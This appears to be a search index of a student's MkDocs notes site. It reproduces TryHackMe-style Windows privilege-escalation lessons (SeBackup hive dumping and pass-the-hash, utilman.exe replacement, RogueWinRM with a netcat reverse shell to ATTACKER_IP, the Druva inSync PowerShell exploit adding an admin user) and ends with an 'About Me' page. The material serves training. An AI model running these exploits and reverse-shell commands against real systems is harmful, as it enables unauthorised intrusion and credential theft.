{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#living-the-moment","title":"living the moment","text":""},{"location":"Abusing_dangerous_privileges/","title":"Abusing dangerous privileges","text":""},{"location":"Abusing_dangerous_privileges/#windows-privileges","title":"Windows Privileges","text":"<p>Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.</p> <p>Each user has a set of assigned privileges that can be checked with the following command:</p> <pre><code>whoami /priv\n</code></pre> <p>A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.</p> <p>While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.</p>"},{"location":"Abusing_dangerous_privileges/#sebackup-serestore","title":"SeBackup / SeRestore","text":"<p>The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p> <p>Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.</p> <p>Log in to the target machine via RDP using the following credentials:</p> <p>User: <code>THMBackup</code></p> <p>Password: <code>CopyMaster555</code></p> <p>This account is part of the \"Backup Operators\" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the \"Open as administrator\" option to use these privileges. We will be asked to input our password again to get an elevated console:</p> <p> </p> <p>Once on the command prompt, we can check our privileges with the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>To backup the SAM and SYSTEM hashes, we can use the following commands:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; reg save hklm\\system C:\\Users\\THMBackup\\system.hive\nThe operation completed successfully.\nC:\\&gt; reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive\nThe operation completed successfully.\n</code></pre> <p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's <code>smbserver.py</code> to start a simple SMB server with a network share in the current directory of our AttackBox:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ mkdir share\nuser@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share\n</code></pre> <p>This will create a share named <code>public</code> pointing to the <code>share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code>copy</code> command in our windows machine to transfer both files to our AttackBox:\u00a0</p> <p>Command Prompt</p> <pre><code>C:\\&gt; copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\\nC:\\&gt; copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\\n</code></pre> <p>And use impacket to retrieve the users' password hashes:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre> <p>We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.173.241\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n[*] Requesting shares on 10.10.175.90.....\n[*] Found writable share ADMIN$\n[*] Uploading file nfhtabqO.exe\n[*] Opening SVCManager on 10.10.175.90.....\n[*] Creating service RoLE on 10.10.175.90.....\n[*] Starting service RoLE.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>"},{"location":"Abusing_dangerous_privileges/#setakeownership","title":"SeTakeOwnership","text":"<p>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.</p> <p>Log in to the target machine via RDP using the following credentials:</p> <p>User: <code>THMTakeOwnership</code></p> <p>Password: <code>TheWorldIsMine2022</code></p> <p>To get the SeTakeOwnership privilege, we need to open a command prompt using the \"Open as administrator\" option. We will be asked to input our password to get an elevated console:</p> <p> </p> <p>Once on the command prompt, we can check our privileges with the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                              State\n============================= ======================================== ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Disabled\n</code></pre> <p>We'll abuse <code>utilman.exe</code> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p> <p> </p> <p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p> <p>To replace utilman, we will start by taking ownership of it with the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; takeown /f C:\\Windows\\System32\\Utilman.exe\nSUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\".\n</code></pre> <p>Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F\nprocessed file: Utilman.exe\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>After this, we will replace utilman.exe with a copy of cmd.exe:</p> <p>Command Prompt</p> <pre><code>C:\\Windows\\System32\\&gt; copy cmd.exe utilman.exe\n        1 file(s) copied.\n</code></pre> <p>To trigger utilman, we will lock our screen from the start button:</p> <p> </p> <p>And finally, proceed to click on the \"Ease of Access\" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:</p> <p> </p>"},{"location":"Abusing_dangerous_privileges/#seimpersonate-seassignprimarytoken","title":"SeImpersonate / SeAssignPrimaryToken","text":"<p>These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.</p> <p>Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.</p> <p>Let's assume we have an FTP service running with user <code>ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:</p> <p> </p> <p>There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the <code>ftp</code> user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user <code>ftp</code>. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user <code>ftp</code>, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the <code>ftp</code> user has access.</p> <p>If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:</p> <p> </p> <p>Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user <code>ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.</p> <p>As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.</p> <p>In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called \"iis apppool\\defaultapppool\" for web applications.</p> <p>To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.</p> <p>We will use RogueWinRM exploit to accomplish both conditions.</p> <p>Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:</p> <p><code>http://10.10.173.241/</code></p> <p>We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:</p> <p> </p> <p>To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the <code>C:\\tools\\</code> folder.</p> <p>The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.</p> <p>If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.</p> <p>Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4442\n</code></pre> <p>And then, use our web shell to trigger the RogueWinRM exploit using the following command:</p> <pre><code>c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\"\n</code></pre> <p> </p> <p>Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.</p> <p>The <code>-p</code> parameter specifies the executable to be run by the exploit, which is <code>nc64.exe</code> in this case. The <code>-a</code> parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be <code>-e cmd.exe ATTACKER_IP 4442</code>.</p> <p>If all was correctly set up, you should expect a shell with SYSTEM privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4442\nListening on 0.0.0.0 4442\nConnection received on 10.10.175.90 49755\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\nc:\\windows\\system32\\inetsrv&gt;whoami\nnt authority\\system\n</code></pre> <p>Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.</p>"},{"location":"Abusing_vulnerable_software/","title":"Abusing vulnerable software","text":"<p>Make sure to click the\u00a0Start Machine\u00a0button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via\u00a0RDP, you can use the following credentials:</p> <p></p> Username thm-unpriv Password Password321"},{"location":"Abusing_vulnerable_software/#unpatched-software","title":"Unpatched Software","text":"<p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the\u00a0<code>wmic</code>\u00a0tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):</p> <pre><code>wmic product get name,version,vendor\n</code></pre> <p>Remember that the\u00a0<code>wmic product</code>\u00a0command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.</p> <p>Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like\u00a0exploit-db,\u00a0packet storm\u00a0or plain old\u00a0Google, amongst many others.</p> <p>Using wmic and Google, can you find a known vulnerability on any installed product?</p>"},{"location":"Abusing_vulnerable_software/#case-study-druva-insync-663","title":"Case Study: Druva inSync 6.6.3","text":"<p>The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.</p> <p>The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.</p> <p>In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.</p> <p>The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.</p> <p>A patch was issued, where they decided to check that the executed command started with the string <code>C:\\ProgramData\\Druva\\inSync4\\</code>, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute <code>C:\\Windows\\System32\\cmd.exe</code>, which is not in the allowed path; you could simply ask the server to run <code>C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe</code> and that would bypass the check successfully.</p> <p>To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:</p> <p></p> <p>The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.</p> <p>Initially published by Matteo Malvica here, the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:</p> <pre><code>$ErrorActionPreference = \"Stop\"\n$cmd = \"net user pwnd /add\"\n$s = New-Object System.Net.Sockets.Socket(\n[System.Net.Sockets.AddressFamily]::InterNetwork,\n[System.Net.Sockets.SocketType]::Stream,\n[System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n</code></pre> <p>You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at\u00a0<code>C:\\tools\\Druva_inSync_exploit.txt</code>). Note that the exploit's default payload, specified in the <code>$cmd</code> variable, will create a user named <code>pwnd</code> in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:</p> <pre><code>net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add\n</code></pre> <p>This will create user <code>pwnd</code> with a password of <code>SimplePass123</code> and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user <code>pwnd</code> exists and is part of the administrators' group:</p> <p>Command Prompt</p> <pre><code>PS C:\\&gt; net user pwnd\nUser name                    pwnd\nFull Name\nAccount active               Yes\n[...]\nLocal Group Memberships      *Administrators       *Users\nGlobal Group memberships     *None\n</code></pre> <p>As a last step, you can run a command prompt as administrator:</p> <p> </p> <pre><code>When prompted for credentials, use the `pwnd` account. From the new command prompt, you can\u00a0retrieve your flag from the Administrator's desktop with the following command\u00a0`type C:\\Users\\Administrator\\Desktop\\flag.txt`.\n</code></pre>"},{"location":"Tools_for_winprivesc/","title":"Tools for winprivesc","text":"<p>Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.</p> <p>Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.</p>"},{"location":"Tools_for_winprivesc/#winpeas","title":"WinPEAS","text":"<p>WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:</p> <p>Command Prompt</p> <pre><code>       `C:\\&gt; winpeas.exe &gt; outputfile.txt`\n</code></pre> <p>WinPEAS can be downloaded here.  </p>"},{"location":"Tools_for_winprivesc/#privesccheck","title":"PrivescCheck","text":"<p>PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.</p> <p>PrivescCheck can be downloaded here.</p> <p>Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the <code>Set-ExecutionPolicy</code> cmdlet as shown below.</p> <p>Powershell</p> <pre><code>       `PS C:\\&gt; Set-ExecutionPolicy Bypass -Scope process -Force PS C:\\&gt; . .\\PrivescCheck.ps1 PS C:\\&gt; Invoke-PrivescCheck`\n</code></pre>"},{"location":"Tools_for_winprivesc/#wes-ng-windows-exploit-suggester-next-generation","title":"WES-NG: Windows Exploit Suggester - Next Generation","text":"<p>Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).</p> <p>WES-NG is a Python script that can be found and downloaded here.</p> <p>Once installed, and before using it, type the <code>wes.py --update</code> command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.</p> <p>To use the script, you will need to run the <code>systeminfo</code>\u00a0command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.</p> <p>Once this is done, wes.py can be run as follows;</p> <p>Kali Linux</p> <pre><code>user@kali$ wes.py systeminfo.txt\n</code></pre>"},{"location":"Tools_for_winprivesc/#metasploit","title":"Metasploit","text":"<p>If you already have a Meterpreter shell on the target system, you can use the <code>multi/recon/local_exploit_suggester</code> module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.</p>"},{"location":"about_me/","title":"About Me","text":"<p>Hello! I'm Lincoln Basnet, an electronics engineering student at Pulchowk Campus. I have a keen interest in various fields, including cybersecurity, networking, scripting, and more. In this document, I'll share a bit more about my passions and experiences in these areas.</p>"},{"location":"about_me/#cybersecurity","title":"Cybersecurity","text":"<p>Cybersecurity has always fascinated me. I enjoy exploring ways to protect computer systems, networks, and data from unauthorized access and malicious activities. Some of the topics I've studied and worked on in the field of cybersecurity include:</p> <ul> <li>Ethical hacking and penetration testing</li> <li>Network security</li> <li>Web application security</li> <li>Cryptography</li> <li>Incident response</li> </ul>"},{"location":"about_me/#networking","title":"Networking","text":"<p>Networking is another area that intrigues me. Understanding how computers and devices communicate and connect with each other is essential in today's interconnected world. Here are some networking topics I've explored:</p> <ul> <li>Network protocols (TCP/IP, DNS, HTTP)</li> <li>Network design and architecture</li> <li>Routing and switching</li> <li>Wireless networking</li> <li>Network troubleshooting</li> </ul>"},{"location":"about_me/#scripting-and-automation","title":"Scripting and Automation","text":"<p>Scripting and automation play a crucial role in simplifying tasks and improving efficiency. I enjoy writing scripts to automate repetitive tasks and streamline workflows. Some scripting languages I've worked with include:</p> <ul> <li>Python</li> <li>Bash scripting</li> <li>PowerShell</li> </ul>"},{"location":"about_me/#hobbies","title":"Hobbies","text":"<p>In addition to my academic pursuits, I have a passion for sports. Playing sports like basketball and football is one of my favorite hobbies. Engaging in sports not only keeps me physically active but also teaches me valuable lessons about teamwork, discipline, and perseverance.</p> <p>Feel free to reach out if you'd like to discuss any of these topics further or collaborate on projects related to cybersecurity, networking, scripting, or any other field of interest!</p>"}]}